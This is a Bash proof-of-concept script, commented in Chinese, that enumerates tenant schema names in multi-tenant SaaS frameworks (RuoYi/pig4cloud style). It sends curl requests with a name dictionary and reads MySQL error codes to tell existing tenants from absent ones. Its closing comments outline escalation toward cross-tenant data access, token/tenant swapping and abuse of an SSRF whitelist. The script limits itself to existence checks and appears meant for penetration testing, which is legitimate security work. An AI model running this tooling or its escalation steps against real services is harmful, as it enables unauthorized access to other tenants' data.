#!/usr/bin/env bash
# ============================================================================
# 多租户 SaaS：schema 存在性 oracle + 租户标识枚举
#
# 背景（若依 / pig4cloud 一类多租户框架的常见实现）：
#   租户隔离靠「一个租户一个 MySQL schema」，连接时把 schema 名拼进 SQL。
#   JDBC URL 或 SQL 里出现 ${tenant} 拼接时，报错信息会泄露 schema 存在性：
#     · schema 不存在 → MySQL error 1146 (Table 'xxx.sys_dict' doesn't exist)
#     · schema 存在   → 正常返回数据 或 空列表（而不是 1146）
#   这个差异就是 oracle：不需要任何权限，只要接口会拼 schema 名。
#
# 另一条常见入口：SSRF 白名单。租户级配置常存一组「允许回调的内网地址」，
#   通过 tenant 参数切换租户后，白名单跟着换 —— 用 A 租户的白名单打 B 租户。
#
# 本脚本只做**存在性判定**，不做任何写入，取到 token 后立即停止。
#
# 用法: ./poc.sh <BASE_URL> <含租户参数的路径> <参数名> [Cookie]
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

if [ $# -lt 3 ]; then
  cat >&2 <<'U'
用法: ./poc.sh <BASE_URL> <路径> <参数名> [Cookie]
  BASE_URL  如 https://saas.example.com
  路径      会拼 tenant 的接口，如 /prod-api/system/dict/data/type/sys_normal_disable
  参数名    租户参数名，如 tenant / tenantId / t / schema / db
示例: ./poc.sh https://x.com /dev-api/system/dict/data/type/sys_user_sex tenantId
判据: 换 tenant 值后，响应从「正常数据」翻转成 error 1146，或反之 → schema 可枚举
U
  exit 1
fi

BASE="${1%/}"; PATHX="${2}"; PARAM="$3"; CK="${4:-}"
need curl || exit 1
CKARG=(); [ -n "$CK" ] && CKARG=(-H "Cookie: $CK")

# schema 名字典。顺序经过实战：先命中率高的，再兜底。
DICT="public master main default tenant base cloud test dev prod demo admin system ry-cloud ruoyi pig"
# 必然不存在的两个作阴性对照
NEG1="zzz_not_exist_$(date +%s)"
NEG2="zzz_not_exist_$(date +%s)_b"

probe() {  # probe <tenant值> → 一行摘要
  local t="$1"
  local url
  if printf '%s' "$PATHX" | grep -q '?'; then
    url="$BASE$PATHX&$PARAM=$t"
  else
    url="$BASE$PATHX?$PARAM=$t"
  fi
  local r c b
  r=$(reqc GET "$url" "${CKARG[@]}")
  c="${r%%$'\t'*}"; b="${r#*$'\t'}"
  local sig="none"
  # 1146 = 表不存在（schema 推断成功但表缺失）；1049 = 库不存在
  printf '%s' "$b" | grep -qE '1146|Table .* doesn.?t exist' && sig="E1146"
  printf '%s' "$b" | grep -qE '1049|Unknown database'            && sig="E1049"
  printf '%s' "$b" | grep -qE 'Unknown column|1054'              && sig="E1054"
  printf '%s' "$b" | grep -qE '"code"\s*:\s*200'                 && sig="OK200"
  printf '%s' "$b" | grep -qE '"code"\s*:\s*(401|403)'           && sig="NOAUTH"
  printf '%s' "$b" | grep -qE '"total"\s*:\s*[0-9]+|"rows"\s*:\s*\[' && sig="$sig+DATA"
  printf '%s\t%s\t%s\n' "$c" "$sig" "${#b}"
}

hdr "0. 阴性对照（必须先证明 oracle 有判别力）"
for n in "$NEG1" "$NEG2"; do
  out=$(probe "$n")
  dim "负样本 $n → $(printf '%s' "$out" | tr '\t' ' ')"
  NEG_OUT="$out"
done
NEG_SIG=$(printf '%s' "$NEG_OUT" | cut -f2)
dim "阴性基准签名: $NEG_SIG"
# 若负样本和正常值一样返回 200 数据，说明 tenant 参数根本没被使用
if printf '%s' "$NEG_SIG" | grep -q 'DATA'; then
  warn "不存在的租户也返回了数据 → 该参数未被用于 schema 拼接，本 oracle 无效"
  verdict "tenant-schema-oracle" "NO_ORACLE" "参数不参与 schema 拼接"
  exit 2
fi
ok "阴性对照有判别力（不存在的租户没有返回数据）"

hdr "1. 字典枚举"
HIT=0
for t in $DICT; do
  out=$(probe "$t")
  c=$(printf '%s' "$out" | cut -f1)
  sig=$(printf '%s' "$out" | cut -f2)
  if [ "$sig" != "$NEG_SIG" ]; then
    ok "候选: $PARAM=$t → HTTP $c  sig=$sig"
    HIT=$((HIT+1))
  else
    dim "$PARAM=$t → $c $sig（与阴性一致）"
  fi
  sleep 0.5
done

hdr "2. 结果收敛"
if [ "$HIT" -eq 0 ]; then
  ok "字典内 0 命中"
  cat >&2 <<'U'
0 命中不等于没有多租户。检查这三件事：
  1) tenant 标识是不是不在 query 上？常见位置：Header（X-Tenant-Id / tenant-id）、
     路径前缀（/api/t1/...）、子域（t1.example.com）、JWT 里的 tenant 字段
  2) 响应是否被 WAF 统一改写？对比带与不带该参数的响应长度
  3) schema 名是否是业务自定义（如 c_1001 / u_8f3a）？那就只能靠信息泄露（配置页/日志）
U
  verdict "tenant-schema-oracle" "NOT_FOUND" "字典 ${#DICT} 词全灭"
else
  warn "$HIT 个租户标识有独立响应"
  cat >&2 <<'U'
下一步（按风险从低到高）：
  A. 用命中的 tenant 值重新请求同一接口，看是否返回**别的租户的数据**
     —— 这才叫越权；只返回空列表只是存在性
  B. 拿 A 租户的 token，配 B 租户的 tenant 参数（token/tenant 交叉）
  C. 找租户注册接口，注册一个新租户，看初始数据是否包含模板数据（能推断 schema 命名规则）
禁止：不要用 oracle 批量跑 10 万级 schema 名，这是扫描行为，且会打爆日志
U
  verdict "tenant-schema-oracle" "ENUMERABLE" "$HIT 个标识有独立响应"
fi
